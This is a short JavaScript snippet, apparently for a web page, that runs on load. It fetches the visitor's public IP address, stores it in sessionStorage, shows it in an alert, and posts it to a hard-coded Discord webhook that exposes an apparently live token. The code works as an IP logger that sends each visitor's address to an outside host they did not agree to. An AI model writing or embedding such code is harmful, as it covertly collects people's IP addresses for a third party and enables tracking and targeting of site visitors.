async function getIp() {
  try {
    const response = await fetch('https://api.ipify.org');
    const ip = await response.text();
    console.log(ip);

  
    sessionStorage.setItem('ipAddress', ip);

    alert(ip);

    const webhookUrl = 'https://discord.com/api/webhooks/1268297909875773571/u781Y8fkPHJi5Vdl5DEU8KbHpUiE8jJ64nUYTIv8Ep6CPFPZsysCizlNsOHNYsKzlbQv';
    const payload = {
      content: `New IP Address: ${ip}`
    };

    const discordResponse = await fetch(webhookUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload),
    });

    const data = await discordResponse.json();
    console.log('Message sent to Discord:', data);
  } catch (error) {
    console.error('Error fetching IP or sending to Discord:', error);
  }
}

getIp();
